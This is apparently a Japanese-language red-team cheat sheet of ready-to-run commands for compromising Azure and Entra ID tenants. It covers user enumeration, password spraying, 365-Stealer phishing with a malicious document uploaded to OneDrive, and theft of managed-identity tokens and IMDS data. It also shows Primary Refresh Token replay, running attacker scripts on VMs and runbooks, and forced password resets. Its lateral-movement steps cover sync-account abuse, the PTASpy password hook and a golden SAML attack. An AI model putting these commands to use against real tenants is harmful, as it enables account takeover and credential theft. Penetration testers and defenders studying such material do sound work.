# AzureCloud-EntraID

## 偵察（Recon）
### ユーザ名（プリンシパル名・メールアドレス）からのテナント情報の取得
```
# AADInternals

> Get-AADIntLoginInformation -UserName admin@microsoft.onmicrosoft.com
```

### ドメインからのテナントIDの取得
```
# AADInternals

> Get-AADIntTenantID -Domain microsoft.onmicrosoft.com
```

### Entra IDとして機能するメールアドレスの特定
```
# o365creepermaz
# C:\temp\users.txt : ユーザ名のリスト

> C:\Python27\python.exe .\o365creeper.py -f C:\temp\users.txt -o C:\temp\validusers.txt
```

### ベース文字列からのAzureリソース検索
```
# MicroBurst
# サブドメイン
> Invoke-EnumerateAzureSubDomains -Base microsoft -Verbose

# Blobストレージ
> Invoke-EnumerateAzureBlobs -Base microsoft -Verbose
```

## 認証情報窃取・侵入（Credential Access・Initial Access）
### パスワードスプレー攻撃
```
# MSOLSpray
# C:\temp\validemails.txt : ユーザ名のリスト

> Invoke-MSOLSpray -UserList C:\temp\validusers.txt -Password P@ssw0rd -Verbose
```

### フィッシングによる認証情報窃取（365stealer）
```
#設定＆起動
> python 365-Stealer.py --set-config
> python 365-Stealer.py --run-app

# OneDriveへのファイルアップロード
> python 365-Stealer.py --refresh-user test@contoso.onmicrosoft.com --upload evil.doc
```

### AppServicesでマネージドIDの認証情報窃取（RCE）
```
> curl $IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01 -H secret:$IDENTITY_HEADER
> curl $IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01 -H secret:$IDENTITY_HEADER
> curl $IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01 -H secret:$IDENTITY_HEADER
```

### Azure Instance Metadata Service（IMDS）によるVMメタデータ（userData）の取得
```
> $userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" 
> [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
```

### Pass the PRT（ROADToken）
#### Nonceの取得
```
> $TenantId = "<TenantId>" 
> $URL = "https://login.microsoftonline.com/$TenantId/oauth2/token" 
> $Params = @{ 
"URI"     = $URL  
"Method"  = "POST" 
} 
> $Body = @{ 
"grant_type" = "srv_challenge" 
} 
> $Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body 
> $Result.Nonce 
```
#### PRTの取得
```
# 取得したいユーザで実行
> ROADToken.exe <Nonce>
```

#### Microsoft 365へのアクセス
```https://login.microsoftonline.com/login.srf```にアクセスし、ブラウザの開発ツールから既存のCookieを全て削除したのち、```x-ms-RefreshTokenCredential```という名前のプロパティを作成し、取得したPRTを格納する。また、HttpOnly属性にチェックを入れる。

再度、```https://login.microsoftonline.com/login.srf```にアクセスするとMicrosoft 365のポータルサイトが開く。

## 列挙（Enum）
### Azモジュール
```
# ログイン
> Install-Module Az -scope CurrentUser

> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzAccount -Credential $creds

#サービスプリンシパル（エンタープライズアプリケーションのシークレット）としてログイン
> $passwd = ConvertTo-SecureString "<Secret>" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("<AppId>", $passwd)
> Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TenantId>

# ログイン（Azure Resource Manager APIトークン）
> $Token = 'eyJ0eX..'
> Connect-AzAccount -AccessToken $Token -AccountId <oid>

# ログイン（Azure Resource Manager API、Microsoft Graph APIトークン）
> $Token = 'eyJ0eX..'
> $graphToken = 'eyJ0eX..'
> Connect-AzAccount -AccessToken $Token -MicrosoftGraphAccessToken $graphToken -AccountId <oid>

# ログイン（Azure Resource Manager API、Key Vault APIトークン）
> $Token = 'eyJ0eX..'
> $keyvaultToken = 'eyJ0eX..'
> Connect-AzAccount -AccessToken $Token -AccountId <oid> -KeyVaultAccessToken $keyvaultToken

# ログイン（Azure Resource Manager API、Azure AD Graph APIトークン）
> $Token = 'eyJ0eX..'
> $aadToken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $Token -GraphAccessToken $aadToken -AccountId <oid>

# トークンの取得
> (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
> (Get-AzAccessToken -ResourceTypeName MSGraph).Token

# ログイン中のユーザでアクセス可能なAzureリソースを列挙
> Get-AzResource

# ログイン中のユーザでアクセス可能なAzureリソースグループを列挙
> Get-AzResourceGroup

# リソースグループのデプロイメント情報の調査
> Get-AzResourceGroupDeployment -ResourceGroupName <ResourceGroupName>
> Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <ResourceGroupName> -DeploymentName <DeploymentName>

# 付与されているAzureリソースに対するロールを列挙
> Get-AzRoleAssignment
> Get-AzRoleAssignment -SignInName test@contoso.onmicrosoft.com
> Get-AzRoleDefinition -Name 'Virtual Machine Command Executor'
> Get-AzRoleDefinition -Name 'Key Vault Secrets User'

# ログイン中のユーザでアクセス可能なVirtualMachineを列挙
> Get-AzVM | fl

# VirtualMachineのネットワークインターフェースの調査
> Get-AzVM -Name <VMName> -ResourceGroupName <ResourceGroupName> | select -ExpandProperty NetworkProfile
> Get-AzNetworkInterface -Name <NetworkInterfaceName>
> Get-AzPublicIpAddress -Name <PublicIpAddressName>

# VirtualMachineでコマンド実行
> Invoke-AzVMRunCommand -VMName <VMName> -ResourceGroupName <ResourceGroupName> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\temp\evil.ps1' -Verbose

# ログイン中のユーザでアクセス可能なApp Servicesを列挙
 > Get-AzWebApp
 > Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}

# ログイン中のユーザでアクセス可能なAzure Functionsを列挙
 > Get-AzFunctionApp

# ログイン中のユーザでアクセス可能なストレージアカウントを列挙
> Get-AzStorageAccount | fl
> Get-AzStorageContainer -Context (New-AzStorageContext -StorageAccountName <StorageAccountName>)

# ログイン中のユーザでアクセス可能なKey Vaultを列挙
> Get-AzKeyVault
> Get-AzKeyVaultSecret -VaultName <VaultName>
> Get-AzKeyVaultSecret -VaultName <VaultName> -Name <SecretName> -AsPlainText

# Entra IDグループの列挙
> Get-AzADGroup -DisplayName <GroupName>
> Get-AzADGroupMember -GroupDisplayName <GroupName>

# Automationの実行
> Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AutomationName> -ResourceGroupName <ResourceGroupName>
> Import-AzAutomationRunbook -Name <RunbookName> -Path C:\temp\evil.ps1 -AutomationAccountName <AutomationName> -ResourceGroupName <ResourceGroupName> -Type PowerShell -Force -Verbose
> Publish-AzAutomationRunbook -RunbookName <RunbookName> -AutomationAccountName <AutomationName> -ResourceGroupName <ResourceGroupName> -Verbose
> Start-AzAutomationRunbook -RunbookName <RunbookName> -RunOn <WorkerGroupName> -AutomationAccountName <AutomationName> -ResourceGroupName <ResourceGroupName> -Verbose

# Extensionの列挙
> Get-AzVMExtension -ResourceGroupName <ResourceGroupName> -VMName <VMName>

# CustomScriptExtensionの修正と実行
> Set-AzVMExtension -ResourceGroupName <ResourceGroupName> -ExtensionName <ExtensionName> -VMName <VMname> -Location <Location> -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"<Command>"}'
```

### azコマンド
```
# ログイン
> az login -u test@contoso.onmicrosoft.com -p P@ssw0rd

# トークンの取得
# Azure Rosource Manager API
> az account get-access-token

# Azure AD Graph API
> az account get-access-token --resource-type aad-graph

# Microsoft Graph API
> az account get-access-token --resource-type ms-graph

# ログインしているユーザの調査
> az ad signed-in-user show
> az ad signed-in-user list-owned-objects

# Automationアカウントの列挙
# まず、> az extension add --upgrade -n automation の実行が必要な場合もある。
> az automation account list

# Virtual Machineの列挙
> az vm list
> az vm list --query "[].[name]" -o table

# App Servicesの列挙
> az webapp list
> az webapp list --query "[].[name]" -o table

# Azure Functionsの列挙
> az functionapp list
> az functionapp list --query "[].[name]" -o table

# ストレージアカウントの列挙
> az storage account list

# Key Vaultの列挙
> az keyvault list
```

### Microsoft Graph モジュール
```
# ログイン（Microsoft Graph APIトークン）
# 違うモジュールなどでMS Graph APIのトークンを事前に取得しておく。
> Install-Module Microsoft.Graph -Scope CurrentUser

> $graphToken = 'eyJ0eX..'
> Connect-MgGraph –AccessToken ($graphToken | ConvertTo-SecureString -AsPlainText -Force)

# ログイン中ユーザのユーザ情報
> Get-MgContext

#ログオン中ユーザのテナント情報
> Get-MgOrganization | fl *

# ユーザの列挙
> Get-MgUser -All

# グループの列挙
> Get-MgGroup -All

# デバイスの列挙
> Get-MgDevice

# グローバル管理者ロールの付与されたユーザの列挙
> $RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
> (Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties

# カスタムロールの列挙
> Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False} | select DisplayName

# 外部アプリケーションの利用可否調査
> (Get-MgPolicyAuthorizationPolicy).DefaultUserRolePermissions.PermissionGrantPoliciesAssigned

# ユーザのグループへの追加
> $params = @{
"@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/<User-ObjectId>"
}
> New-MgGroupMemberByRef -GroupId <Group-ObjectId> -BodyParameter $params

# 管理単位の列挙
> Get-MgDirectoryAdministrativeUnit
> Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId <UnitId>

# 管理単位のロール列挙
> Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId <UnitId> | fl *
> (Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId <UnitId>).RoleMemberInfo

# ロールの詳細調査
> Get-MgDirectoryRole -DirectoryRoleId <RoleId>

# 特定のユーザのパスワード変更
> $params = @{
     passwordProfile = @{
         forceChangePasswordNextSignIn = $false
         password = "P@ssw0rd"
     } 
}
> Update-MgUser -UserId "test@contoso.onmicrosoft.com" -BodyParameter $params

# 特定ユーザのプロパティ変更
> Update-MgUser -UserId <ObjectId> -OtherMails other@contoso.onmicrosoft.com
```

### AzureADモジュール
```
# ログイン
> Install-Module AzureAD -Scope CurrentUser

> Import-Module AzureAD
> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzureAD -Credential $creds

# ログイン（Azure AD Graph APIトークン）
> $aadToken='eyJ0eX..'
> Connect-AzureAD -AadAccessToken $AADToken -TenantId <TenantId> -AccountId <oid>

# ユーザの列挙
> Get-AzureADUser -All $true
> Get-AzureADUser -All $true | select UserPrincipalName
> Get-AzureADUser -ObjectId <ObjectId> | fl *

# グループの列挙
> Get-AzureADGroup -All $true

# ユーザのグループへの追加
> Add-AzureADGroupMember -ObjectId <Group-ObjectId> -RefObjectId <User-ObjectId> -Verbose

# デバイスの列挙
> Get-AzureADDevice

# グローバル管理者ロールの付与されたユーザの列挙
> Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember

# 管理単位の列挙
> Get-AzureADMSAdministrativeUnit
> Get-AzureADMSAdministrativeUnitMember -Id <UnitId>

# 管理単位のロール列挙
> Get-AzureADMSScopedRoleMembership -Id <UnitId> | fl *

# ロールの詳細調査
> Get-AzureADDirectoryRole -ObjectId <RoleId>

# 特定のユーザのパスワード変更
> $password = ConvertTo-SecureString "P@ssw0rd" -AsPlainText –Force
> (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "test@contoso.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $Password –Verbose

# 特定ユーザのプロパティ変更
> Set-AzureADUser -ObjectId <ObjectId> -OtherMails other@contoso.onmicrosoft.com -Verbose

# アプリケーションプロキシが構成されているエンタープライズアプリケーションの列挙
> Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}

# サービスプリンシパルの列挙
> Get-AzureADServicePrincipal -All $true
> Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "DisplayName"}
```

### AzureADPreviewモジュール
```
# ログイン
> Install-Module AzureADPreview -Scope CurrentUser

> Import-Module AzureADPreview
> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzureAD -Credential $creds

# カスタムロールの列挙
> Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName

# 外部アプリケーションの利用可否調査
> (Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```

### roadreconによるEntra ID列挙
```
> roadrecon auth -u test@contoso.onmicrosoft.com -p P@ssw0rd
> roadrecon gather
> roadrecon gui

# 条件付きアクセスポリシーの列挙
> roadrecon plugin policies
```

### stormspotterによるAzureリソース列挙
```
# バックエンド環境の起動（別途neo4jも必要）
> python .\stormspotter\backend\ssbackend.pyz

# フロントエンド環境の起動
> .\stormspotter\frontend\dist\spa\quasar.cmd serve -p 9091 --history

# コレクターの実行
> az login -u test@contoso.onmicrosoft.com -p P@ssw0rd
> python .\stormspotter\stormcollector\sscollector.pyz cli
```

### AzureHoundによるAzureCloud列挙
```
# コレクターの実行
> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzAccount -Credential $creds
> Import-Module AzureAD
> Connect-AzureAD -Credential $creds

> Import-Module .\AzureHound.ps1
> Invoke-AzureHound -Verbose

# BloouHoundでの解析（CYPHER QUERY）
MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname
MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
```

### Microsoft Graph APIへのアクセス
```
> $graphToken = 'eyJ0eX..'
# テナント内の全ユーザ列挙
> $URI = 'https://graph.microsoft.com/v1.0/users'
# テナント内のエンタープライズアプリケーション列挙
> $URI = 'https://graph.microsoft.com/v1.0/applications'
# ユーザーの所属グループ列挙
> $URI = 'https://graph.microsoft.com/v1.0/users/<PrincipalName(email)>/memberOf'

> $RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $graphToken"
 }
}

> (Invoke-RestMethod @RequestParams).value
```

### Azure Resource Manager APIへのアクセス
```
# サブスクリプションの列挙
> $Token = 'eyJ0eX..'
> $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'

> $RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}

> (Invoke-RestMethod @RequestParams).value 
```

## 横展開（Lateral Movement）
### オンプレからクラウドへの横展開
悪用可能なEntra ID Connectによる認証連携方式は以下3つ。
- Password Hash Sync（PHS）
- Pass-Through Authentication（PTA）
- Active Directory Federation Sercices（ADFS）

どの方式においても、コネクターをインストールしているオンプレサーバへの侵入と管理者権限の窃取が前提で、<BR>
オンプレのActive Directory環境からクラウドのEntra ID環境への横展開ができる場合がある。

#### PHS方式での横展開
同期用ユーザの悪用によるパスワード再設定
```
# 同期状況の確認
> Get-ADSyncConnector

# 同期用のユーザの認証情報取得（オンプレ用の「MSOL_*」、クラウド用の「Sync_*」）
# MSOL_*ユーザにはオンプレADのレプリケーション権限が付与
# Sync_*ユーザにはEntra IDのパスワード再設定権限が付与

> Import-Module .\AADInternals\AADInternals.psd1
> Get-AADIntSyncCredentials

# Sync_*ユーザのAzure AD Graph APIトークンを取得
> $passwd = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("Sync_*@contoso.onmicrosoft.com", $passwd)
> Get-AADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache

# 任意のパスワードに設定
> Get-AADIntUser -UserPrincipalName target@contoso.onmicrosoft.com | select ImmutableId
> Set-AADIntUserPassword -SourceAnchor "<ImmutableId>" -Password "P@ssw0rd" -Verbose
```

#### PTA方式での横展開
認証プロセスのフックによる認証情報窃取
```
# 同期状況の確認
> Get-ADSyncConnector

# AADIntPTASpyのインストール
> Import-Module .\AADInternals\AADInternals.psd1
> Install-AADIntPTASpy

# 記録された認証情報の確認
> Get-AADIntPTASpyLog -DecodePasswords
```

#### ADFS方式での横展開
SAML署名用証明書の窃取によるゴールデンSAML攻撃
```
# 同期状況の確認
> Get-AdfsProperties
> Get-MsolDomainFederationSettings -DomainName contoso.com

# 証明書の抽出
> Import-Module .\AADInternals\AADInternals.psd1
> Export-AADIntADFSSigningCertificate 

# targetユーザでログイン可能なHTMLを生成
> Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll
> Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1
> [System.Convert]::ToBase64String((Get-ADUser -Identity target | select -ExpandProperty ObjectGUID).tobytearray())
> Open-AADIntOffice365Portal -ImmutableID <ImmutableId> -Issuer <IssuerUri> -PfxFileName ADFSSigningCertificate.pfx -Verbose
```
